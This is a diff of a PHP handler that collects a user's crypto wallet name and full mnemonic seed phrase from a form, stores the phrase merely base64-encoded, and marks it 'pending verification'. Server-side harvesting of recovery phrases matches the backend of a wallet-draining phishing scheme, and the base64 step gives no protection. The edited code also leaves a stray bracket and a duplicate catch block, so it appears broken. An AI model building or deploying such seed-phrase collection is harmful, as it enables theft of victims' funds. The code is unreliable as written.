@@ -23,25 +23,17 @@ try {
 
     $user_id = $_SESSION['user_id'];
 
-    // Get POST data
-    $input = file_get_contents('php://input');
-    $data = json_decode($input, true);
-
-    if (!$data) {
-        // Fallback to form data if JSON fails
-        $data = [
-            'wallet_name' => $_POST['wallet_name'] ?? null,
-            'mnemonic' => $_POST['mnemonic'] ?? null
-        ];
-    }
+    // Get POST data - wallet_handler.php receives FormData from JavaScript
+    $wallet_name = $_POST['wallet_name'] ?? null;
+    $mnemonic = $_POST['mnemonic'] ?? null;
 
     // Validate required fields
-    if (empty($data['wallet_name']) || empty($data['mnemonic'])) {
+    if (empty($wallet_name) || empty($mnemonic)) {
         throw new Exception('Wallet name and mnemonic are required.');
     }
 
-    $wallet_name = trim($data['wallet_name']);
-    $mnemonic = trim($data['mnemonic']);
+    $wallet_name = trim($wallet_name);
+    $mnemonic = trim($mnemonic);
 
     // Validate mnemonic format (12 or 24 words)
     $words = explode(' ', $mnemonic);
@@ -52,12 +44,8 @@ try {
     }
 
     // Encrypt mnemonic for security (basic encryption - use proper encryption in production)
-    $encryption_key = 'your_secret_key'; // Should be in config
     $encrypted_mnemonic = base64_encode($mnemonic); // Use openssl_encrypt() in production
 
-    // Prepare SQL to save wallet connection
-    // Uses 'user' table (not 'users') with fields: id, connected_wallet_name, wallet_phrase, wallet_phrase_verified
-    
     // Get database connection
     include '../database/db_config.php';
     
@@ -96,8 +84,19 @@ try {
         'message' => 'Wallet connection request received and pending verification.',
         'wallet_name' => $wallet_name,
         'word_count' => $word_count,
-        'timestamp' => time(),
-        'user_id' => $user_id
+        'timestamp' => time()
+    ]);
+    exit;
+
+} catch (Exception $e) {
+    http_response_code(400);
+    echo json_encode([
+        'success' => false,
+        'message' => $e->getMessage(),
+        'error_code' => 'WALLET_ERROR'
+    ]);
+    exit;
+}
     ]);
 
 } catch (Exception $e) {
